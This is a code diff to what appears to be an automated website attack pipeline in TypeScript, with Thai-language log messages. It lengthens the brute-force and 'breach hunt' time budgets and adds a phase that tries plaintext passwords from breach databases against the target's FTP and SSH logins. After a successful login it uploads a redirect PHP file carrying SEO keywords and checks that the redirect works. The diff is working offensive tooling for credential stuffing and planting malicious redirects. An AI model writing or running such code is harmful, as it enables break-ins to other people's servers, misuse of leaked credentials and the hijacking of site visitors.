@@ -1148,7 +1148,7 @@ export async function runUnifiedAttackPipeline(
 
   // ─── Phase 0+1: AI Target Analysis + Pre-screening (PARALLEL to save time) ───
   const reconStartTime = Date.now();
-  const RECON_TIME_BUDGET = Math.min(GLOBAL_TIMEOUT * 0.25, 60 * 1000); // Max 25% of total time or 60s for recon (pipeline is just 1 of 20 methods)
+  const RECON_TIME_BUDGET = Math.min(GLOBAL_TIMEOUT * 0.20, 90 * 1000); // Max 20% of total time or 90s for recon
   let aiTargetAnalysis: AiTargetAnalysis | null = null;
 
   loggedOnEvent({
@@ -1906,7 +1906,7 @@ export async function runUnifiedAttackPipeline(
 
       // Calculate remaining time for brute force (max 90s or remaining pipeline time, whichever is less)
       const remainingMs = Math.max(deadline - Date.now(), 30000);
-      const bruteForceTimeout = Math.min(90000, remainingMs); // 90s max — pipeline is 1 of 20 methods
+      const bruteForceTimeout = Math.min(120000, remainingMs); // 120s max — brute force needs time to try breach creds
 
       wpBruteForceResult = await timedRace(
         () => wpBruteForce({
@@ -2026,7 +2026,7 @@ export async function runUnifiedAttackPipeline(
       }
 
       const remainingMs = Math.max(deadline - Date.now(), 15000);
-      const breachTimeout = Math.min(60000, remainingMs); // Max 60s — pipeline is 1 of 20 methods
+      const breachTimeout = Math.min(90000, remainingMs); // Max 90s — breach hunt is critical for FTP/SSH creds
 
       breachHuntResult = await timedRace(
         () => executeBreachHunt({
@@ -2157,6 +2157,114 @@ export async function runUnifiedAttackPipeline(
         step: "error",
         detail: `⚠️ Breach Hunt ล้มเหลว: ${error.message}`,
         progress: 49,
+      });
+    }
+  }
+
+  // ─── Phase 2.5e2: EARLY FTP/SSH Login with Breach Credentials (HIGH SUCCESS RATE) ───
+  // This is the MOST IMPORTANT attack vector — real passwords from breach DBs
+  // Previously only at Phase 5.6 (LeakCheck) which was NEVER reached due to pipeline timeout
+  let earlyFtpResult: FTPUploadResult | null = null;
+  let earlySshResult: SSHUploadResult | null = null;
+  if (!shouldStop('ftp_upload')) {
+    const breachCreds = breachHuntResult?.credentials?.filter(
+      c => c.passwordType === 'plaintext' && (c.confidence === 'high' || c.confidence === 'medium')
+    ) || [];
+    const targetDomain = config.targetUrl.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+    
+    if (breachCreds.length > 0) {
+      loggedOnEvent({
+        phase: 'ftp_upload' as any,
+        step: 'breach_ftp_ssh',
+        detail: `🔑 Phase 2.5e2: FTP/SSH Login — ลอง ${Math.min(breachCreds.length, 15)} breach credentials ผ่าน FTP:21 + SSH:22...`,
+        progress: 50,
+      });
+      
+      // Try FTP login with breach creds (top 15)
+      for (const cred of breachCreds.slice(0, 15)) {
+        if (shouldStop('ftp_upload')) break;
+        const username = cred.email ? cred.email.split('@')[0] : '';
+        if (!username) continue;
+        
+        try {
+          const ftpRes = await timedRace(
+            () => ftpUploadRedirect({
+              credential: { host: originIp || targetDomain, username, password: cred.password, port: 21 },
+              redirectUrl: config.redirectUrl,
+              targetDomain,
+              timeout: 15000,
+              onProgress: (msg) => loggedOnEvent({ phase: 'ftp_upload' as any, step: 'ftp_progress', detail: `📂 [Breach FTP] ${msg}`, progress: 50 }),
+            }),
+            capTimeout(20000),
+            'Breach FTP timeout',
+          );
+          if (ftpRes.success && ftpRes.url) {
+            earlyFtpResult = ftpRes;
+            aiDecisions.push(`📂 BREACH FTP สำเร็จ! ${username}@${targetDomain} → ${ftpRes.url}`);
+            loggedOnEvent({ phase: 'ftp_upload' as any, step: 'ftp_success', detail: `✅ BREACH FTP สำเร็จ! ${ftpRes.url} (${ftpRes.method})`, progress: 51 });
+            const verification = await verifyUploadedFile(ftpRes.url, config.redirectUrl, onEvent);
+            uploadedFiles.push({
+              url: ftpRes.url,
+              shell: { type: 'redirect_php' as any, content: '', filename: ftpRes.filePath || 'redirect.php', contentType: 'application/x-php', description: 'Breach FTP early upload', id: `breach_ftp_early_${Date.now()}`, targetVector: 'breach_ftp_early', bypassTechniques: ['breach_cred', 'ftp'], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get' },
+              method: `breach_ftp_early_${cred.source}`,
+              verified: verification.verified,
+              redirectWorks: verification.redirectWorks,
+              redirectDestinationMatch: verification.redirectDestinationMatch,
+              finalDestination: verification.finalDestination,
+              httpStatus: verification.httpStatus,
+              redirectChain: verification.redirectChain,
+            });
+            if (verification.redirectWorks) break;
+          }
+        } catch { /* continue to next cred */ }
+      }
+      
+      // Try SSH login with breach creds (top 10)
+      if (!hasSuccessfulRedirect()) {
+        for (const cred of breachCreds.slice(0, 10)) {
+          if (shouldStop('ftp_upload')) break;
+          const username = cred.email ? cred.email.split('@')[0] : '';
+          if (!username) continue;
+          
+          try {
+            const sshRes = await timedRace(
+              () => sshUploadRedirect({
+                credential: { host: originIp || targetDomain, username, password: cred.password, port: 22 },
+                redirectUrl: config.redirectUrl,
+                targetDomain,
+                timeout: 20000,
+                onProgress: (msg) => loggedOnEvent({ phase: 'ftp_upload' as any, step: 'ssh_progress', detail: `🔐 [Breach SSH] ${msg}`, progress: 51 }),
+              }),
+              capTimeout(25000),
+              'Breach SSH timeout',
+            );
+            if (sshRes.success && sshRes.url) {
+              earlySshResult = sshRes;
+              aiDecisions.push(`🔐 BREACH SSH สำเร็จ! ${username}@${targetDomain} → ${sshRes.url}`);
+              loggedOnEvent({ phase: 'ftp_upload' as any, step: 'ssh_success', detail: `✅ BREACH SSH สำเร็จ! ${sshRes.url} (${sshRes.method})`, progress: 52 });
+              const verification = await verifyUploadedFile(sshRes.url, config.redirectUrl, onEvent);
+              uploadedFiles.push({
+                url: sshRes.url,
+                shell: { type: 'redirect_php' as any, content: '', filename: sshRes.filePath || 'redirect.php', contentType: 'application/x-php', description: 'Breach SSH early upload', id: `breach_ssh_early_${Date.now()}`, targetVector: 'breach_ssh_early', bypassTechniques: ['breach_cred', 'ssh'], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: 'http_get' },
+                method: `breach_ssh_early_${cred.source}`,
+                verified: verification.verified,
+                redirectWorks: verification.redirectWorks,
+                redirectDestinationMatch: verification.redirectDestinationMatch,
+                finalDestination: verification.finalDestination,
+                httpStatus: verification.httpStatus,
+                redirectChain: verification.redirectChain,
+              });
+              if (verification.redirectWorks) break;
+            }
+          } catch { /* continue to next cred */ }
+        }
+      }
+      
+      loggedOnEvent({
+        phase: 'ftp_upload' as any,
+        step: 'early_login_complete',
+        detail: `✅ Phase 2.5e2: Breach FTP/SSH — ${uploadedFiles.filter(f => f.method.startsWith('breach_ftp_early') || f.method.startsWith('breach_ssh_early')).length} uploads`,
+        progress: 52,
       });
     }
   }
